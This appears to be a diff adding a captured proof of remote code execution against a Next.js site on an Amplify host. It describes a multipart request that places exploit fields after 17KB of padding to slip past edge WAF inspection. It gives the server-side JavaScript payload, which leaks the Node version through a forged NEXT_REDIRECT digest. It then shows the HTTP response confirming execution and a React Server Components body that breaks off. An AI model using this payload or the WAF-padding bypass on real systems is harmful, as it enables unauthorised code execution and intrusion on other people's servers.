@@ -1,0 +1,29 @@
+POST https://main.d4zeeqgazhley.amplifyapp.com/  (multipart, exploit fields placed after 17KB padding - bypasses edge WAF body inspection)
+Executed server-side (read-only): var res='R2S_CONFIRMED_'+process.version;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/r2s?m='+res+';307;'});
+
+HTTP 303 See Other
+Content-Type: text/x-component
+Transfer-Encoding: chunked
+Connection: keep-alive
+Date: Mon, 27 Jul 2026 05:21:11 GMT
+x-nextjs-prerender: 1
+x-powered-by: Next.js
+vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
+cache-control: private, no-cache, no-store, max-age=0, must-revalidate
+x-action-revalidated: [[],0,0]
+x-action-redirect: /r2s?m=R2S_CONFIRMED_v18.20.8;push
+x-nextjs-cache: HIT
+X-Cache: Miss from cloudfront
+Via: 1.1 ae43d281125b254ba267bbf70e4f9a24.cloudfront.net (CloudFront)
+X-Amz-Cf-Pop: NRT57-P4
+Alt-Svc: h3=":443"; ma=86400
+X-Amz-Cf-Id: bgyUPWk29muU8ktUcuXhW8iU_5yzc6SO9CuZ4Urm3FDAHP_nd6UEkw==
+
+--- body ---
+1:"$Sreact.fragment"
+2:I[9275,[],""]
+3:I[1343,[],""]
+4:I[3120,[],"OutletBoundary"]
+6:I[3120,[],"MetadataBoundary"]
+8:I[3120,[],"ViewportBoundary"]
+0:{"b":"eG0X4XkBayYYQq6uv-WIB","f":[[["",{"children":["/_not-found",{"children":["__PAGE__?{\"m\":\"R2S_CONFIRMED_v18.20.8\"}",{}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d159c55dcccaf26b.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":[["$","link",null,{"rel":"dns-prefetch","href":"https://download.blender.org/"}],["$","link",null,{"rel":"dns-prefetch","href":"https://main.d4zeeqgazhley.amplifyapp.com/"}]]}],["$","body",null,{"className":"__variable_1e4310 __variable_3d0cc1 antialiased max-md:text-xs","children":["$","$L2",null,{"parallelRouterKey":"children","segmentPath":["children"],"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":"404"}],["$","div",null,
